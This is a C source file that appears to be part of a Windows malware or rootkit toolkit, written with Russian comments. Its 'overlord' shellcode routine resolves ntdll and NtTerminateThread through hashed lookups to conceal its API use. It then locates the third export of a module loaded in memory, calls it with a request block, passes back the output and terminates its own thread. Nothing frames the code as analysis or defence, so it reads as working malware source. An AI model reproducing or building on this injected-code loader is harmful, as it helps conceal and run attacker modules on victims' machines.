
#include <ntifs.h>
#include <wdm.h>
#include <ntstrsafe.h>

#define DLL_PROCESS_ATTACH   1
#define DLL_THREAD_ATTACH    2
#define DLL_THREAD_DETACH    3
#define DLL_PROCESS_DETACH   0

#include "../../../../../../shared_code/types.h"
#include "../../../../../../shared_code/pe.h"
#include "../../../zshellcode.h"
#include "../../../../../mod_shared/overlord_ext.h"

typedef int (*FnHelperRequest)(poverlord_request_info_t pOri);

#define INVALID_HANDLE_VALUE ((HANDLE)(LONG_PTR)-1)

#define GET_DIRECTORY_PTR(pNtHdrs, idx)	&pNtHdrs->OptionalHeader.DataDirectory[idx]

#ifdef _WIN64
VOID overlord(pshellcode64_block_t pScBlock)
#else
VOID overlord(pshellcode_block_t pScBlock)
#endif // _WIN64
{
    PIMAGE_DOS_HEADER dosHdr;
    PIMAGE_NT_HEADERS ntHdrs;
    uint32_t* addressOfFunctions;
    FnHelperRequest fnHelperRequest = NULL;
    PIMAGE_EXPORT_DIRECTORY pExports;
    uint32_t exportSize;
    uint8_t* moduleBase;
    int ret = 0;
    uint8_t* ntdllBase;
    FnNtTerminateThread fnNtTerminateThread = NULL;
    poverlord_request_info_t pOri = (poverlord_request_info_t)pScBlock->inData;
    uint8_t* origBuffer = pOri->moduleBase;

    do {
        ntdllBase = ((FnGetNtDLLBase)pScBlock->fnGetNtDLLBase)(NTDLL_DLL_HASH);

        if (ntdllBase == NULL) {
            break;
        }
        if ((fnNtTerminateThread = ((FnGetFuncAddress)pScBlock->fnGetFuncAddress)(ntdllBase, NtTerminateThread_Hash)) == NULL) {
            break;
        }

        dosHdr = (PIMAGE_DOS_HEADER)origBuffer;
        ntHdrs = (PIMAGE_NT_HEADERS)(origBuffer + dosHdr->e_lfanew);

        pExports = (PIMAGE_EXPORT_DIRECTORY)(origBuffer + ntHdrs->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);
        exportSize = ntHdrs->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].Size;

        // Должна быть таблица экспорта с ненулевым размером и двумя ординалами  @1 и @2 и @3.
        if ((uint8_t*)pExports == origBuffer || exportSize == 0 || pExports->Base != 1 || pExports->NumberOfFunctions != 3) {
            break;
        }

        addressOfFunctions = (uint32_t*)(origBuffer +  pExports->AddressOfFunctions);

        // Смещения не должны быть нулевыми.
        if (addressOfFunctions[2] == 0) {
            break;
        }

        fnHelperRequest = (pvoid_t)(origBuffer + addressOfFunctions[2]);

        // Проверяем является ли адрес форвардным.
        if (((uint8_t*)fnHelperRequest >= (uint8_t*)pExports) && ((uint8_t*)fnHelperRequest < ((uint8_t*)pExports + exportSize))) {
            break;
        }

        ret = fnHelperRequest(pOri);
    } while (0);

    if (ret) {
        pScBlock->pOutData = (uint8_t*)pOri->outData;
        pScBlock->outDataSize = pOri->outSize;
    }

    pScBlock->result = (ret ? SC_RESULT_OK : SC_RESULT_BAD);

    if (fnNtTerminateThread != NULL) {
        fnNtTerminateThread(0, STATUS_SUCCESS);
    }
}
